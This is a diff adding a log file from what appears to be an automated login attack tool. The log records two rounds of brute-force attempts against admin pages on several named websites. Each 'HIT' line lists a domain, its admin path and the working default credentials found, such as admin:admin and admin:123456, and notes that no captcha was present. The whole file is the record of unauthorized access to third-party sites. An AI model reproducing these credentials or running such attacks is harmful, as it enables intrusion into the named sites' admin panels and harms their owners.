@@ -1,0 +1,18 @@
+[03:05:52] ==================================================
+[03:05:52] AUTO LOGIN ATTACK START
+[03:05:52] ==================================================
+[03:05:52] 
+--- Round 1 ---
+[03:06:29] [!] HIT (no captcha): pmtemple.com /admin admin:admin
+[03:07:05] [!] HIT (no captcha): ehuoyan.com /admin.php admin:123456
+[03:07:06] [!] HIT (no captcha): chegva.com /admin admin:admin
+[03:08:54] [!] HIT (no captcha): thyuu.com /admin admin:admin
+[03:09:34] [!] HIT (no captcha): geindex.com /login admin:admin
+[03:09:35] [!] HIT (no captcha): zhujiwiki.com /admin admin:admin
+[03:11:30] Round 1 done. Total hits: 6
+[03:11:30] Sleeping 60s before next round...
+[03:12:30] 
+--- Round 2 ---
+[03:13:04] [!] HIT (no captcha): pmtemple.com /admin admin:admin
+[03:13:36] [!] HIT (no captcha): ehuoyan.com /admin.php admin:123456
+[03:13:37] [!] HIT (no captcha): chegva.com /admin admin:admin
